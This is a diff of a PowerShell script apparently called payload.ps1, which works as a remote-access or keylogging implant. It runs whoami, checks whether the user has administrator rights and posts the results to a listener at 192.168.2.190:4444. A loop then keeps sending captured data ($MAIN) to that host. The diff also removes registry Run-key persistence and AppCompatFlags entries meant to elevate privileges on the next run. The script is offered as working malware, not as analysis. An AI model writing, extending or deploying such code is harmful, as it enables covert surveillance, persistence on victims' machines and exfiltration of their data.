@@ -6,20 +6,14 @@ $hmal = "New Connection from "
 
 $hmal = whoami
 
-$Response = Invoke-WebRequest -Timeout 1 -Method Post -URI 192.168.2.190:4444 -Body $hmal,$testadmin -UseBasicParsing
+$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $False){
+	$check = "not admin"
+}else{
+	$check = "is admin"
+}
 
-#attempt to set per
-
-New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
-    -Name "%HOMEPATH%\payload.ps1" `
-    -Value "%HOMEPATH%\payload.ps1 -autostart"
-
-# attempt to elevate permissions on next execution
-
-New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" `
-    -Name "%HOMEPATH%\payload.ps1" `
-    -Value "%HOMEPATH%\payload.ps1"
-
+$Response = Invoke-WebRequest -Timeout 1 -Method Post -URI 192.168.2.190:4444 -Body $hmal,$testadmin,$check -UseBasicParsing
 
 while ($true)
 {
@@ -30,7 +24,7 @@ while ($true)
 
 	if($MAIN -eq $FALSE){
 	}else{ 
-	$Response = Invoke-WebRequest -Timeout 1 -Method Post -URI 192.168.2.190:4444 -Body $MAIN -UseBasicParsing	
+		$Response = Invoke-WebRequest -Timeout 1 -Method Post -URI 192.168.2.190:4444 -Body $MAIN -UseBasicParsing	
 	}
 	sleep 0.5
 }
